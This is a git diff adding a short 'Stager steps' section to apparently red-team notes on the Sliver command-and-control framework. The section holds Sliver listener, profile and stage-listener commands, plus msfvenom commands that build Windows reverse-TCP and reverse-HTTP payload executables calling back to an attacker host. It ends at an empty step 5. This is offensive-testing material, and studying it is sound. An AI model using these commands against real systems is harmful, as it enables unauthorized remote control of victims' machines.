@@ -157,3 +157,30 @@ It is valuable to remember that when interacting with sessions in `Sliver`, the
 - Extensions are artifacts of native code loaded by the implant and passed specific callbacks to return data to the C2 server
 
 - *OPSEC Note: By default, execute-assembly will start a sacrificial process (notepad.exe); this can be changed using the --process and specifying the process.*
+
+## Stager steps
+
+1. start a listener
+```bash
+mtls -l <port1>
+```
+
+2. configure a profile
+```bash
+profile new --mtls ip:port1 -l -f <option like shellcode> <profile name>
+profile new beacon --mtls ip:port1 -f -f <option> <profile name>
+```
+
+3. configure stage listeners
+```bash
+stage-listener -u http://LHOST:<port2> -p <profile name>
+stage-listener -u tcp://LHOST:<port3> -p <profile name>
+```
+
+4. example payloads with msfvenom 
+```bash
+msfvenom -p windows/x64/custom/reverse_tcp lhost=LHOST lport=<port3> -f exe -o tcp.exe 
+msfvenom -p windows/x64/custom/reverse_winhttp lhost=LHOST lport=<port2> LURI=/path.woff -f exe -o http.exe
+```
+
+5. 
